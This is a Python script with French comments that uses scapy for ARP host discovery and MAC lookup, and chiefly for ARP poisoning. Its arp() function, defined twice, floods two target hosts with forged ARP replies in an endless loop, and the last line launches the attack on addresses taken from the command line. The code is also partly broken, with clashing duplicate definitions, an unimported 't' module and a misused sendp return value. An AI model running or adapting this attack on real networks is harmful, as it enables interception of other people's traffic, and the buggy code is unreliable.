#! /usr/bin/python3
from scapy.all import Ether, ARP, sendp, srp
from sys import argv

def discovery(dst, time):
    reponse = ''
    paquet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst= dst)
    rep, pasrep = sendp(paquet, timeout=int(time))
    print(rep)
    for sent, received in rep:
        print('ca boucle')
        reponse = reponse + received[ARP].psrc + " "
    return reponse

# print(discovery('192.168.56.106',5))

def arp_display(pkt):
    #if pkt[ARP].op == 1: #who-has (request)
        #return f"Request: {pkt[ARP].psrc} is asking about {pkt[ARP].pdst}"
    if pkt[ARP].op == 2: #is-at (response)
        return f"*Response: {pkt[ARP].hwsrc} has address {pkt[ARP].psrc}"

# sniff(prn=arp_display, filter="arp", store=0, iface='enp0s3', count=5)


def getmac(ip):
    paquet = Ether()/ARP(op=1, pdst=ip)
    reponse = srp(paquet, verbose=False, timeout=3)
    print(reponse)



def mac(cible1, cible2):
  cible = [cible1, cible2]
  rep = []

  for i in cible:
    paquet = Ether()/ARP(op=1, pdst=i)
    rep.append(srp(paquet, iface='enp0s3'))
  return rep[0][0][0][1].hwsrc, rep[1][0][0][1].hwsrc

#print(mac(argv[1],argv[2]))


def mac(ip:str)->str:
    '''Recupere l'adresse MAC associer a une adresse IP grace a un message ARP. \n
    ip: est une adresse IP
    '''
    paquet = Ether()/ARP(op=1, pdst=ip) #Paquet ARP 
    rep = srp(paquet, iface='enp0s3') #Reponse au ARP 
    return rep[0][0][1].hwsrc #Renvoie l'adresse MAC


def arp(ipa:str, ipb:str)->None:
  '''ARP POISONING: \n
  ipa: Une des deux adresse IP que l'on veut empoisonner. \n
  ipb: L'autre adresse IP que l'on veut empoisonner.
  '''

  maclist = [mac(ip) for ip in [ipa, ipb]]  
  
  #On cree deux paquets ARP qui associe l'adresse IP (a et b) a l'adresse MAC du PC
  paquet1 = Ether(dst=maclist[0])/ARP(op=2, pdst=ipa, psrc=ipb) 
  paquet2 = Ether(dst=maclist[1])/ARP(op=2, pdst=ipb, psrc=ipa) 
  while True: #Boucle infinie
    sendp(paquet1, iface='enp0s3')
    sendp(paquet2, iface='enp0s3')
    t.sleep(60) #Arrete le processeus pendant 60s


def mac(ipa, ipb):
  '''ecrit un docstring'''
  cible = [ipa, ipb]
  rep = []
  for i in cible:
    paquet = Ether()/ARP(op=1, pdst=i) #Commente
    rep.append(srp(paquet, iface='enp0s3')) #Commente
  return rep[0][0][0][1].hwsrc, rep[1][0][0][1].hwsrc #Renvoie les deux adresses macs


def arp(ipa:str, ipb:str)->None:
  '''ARP POISONING: \n
  Cette fonction est  
  ipa: Une des deux adresse IP que l'on veut empoisonner. \n
  ipb: L'autre adresse IP que l'on veut empoisonner.
  '''
  cible = [ipa, ipb]
  maclist = mac(ipa, ipb)
  #On cree deux paquets ARP qui associe l'adresse IP (a et b) a l'adresse MAC du PC
  paquet1 = Ether(dst=maclist[0])/ARP(op=2, pdst=ipa, psrc=ipb) 
  paquet2 = Ether(dst=maclist[1])/ARP(op=2, pdst=ipb, psrc=ipa) 
  while True: #Boucle infinie
    sendp(paquet1, iface='enp0s3')
    sendp(paquet2, iface='enp0s3')
    t.sleep(60) #Arrete le processeus pendant 60s


arp(argv[1], argv[2])
#print(mac(argv[1]))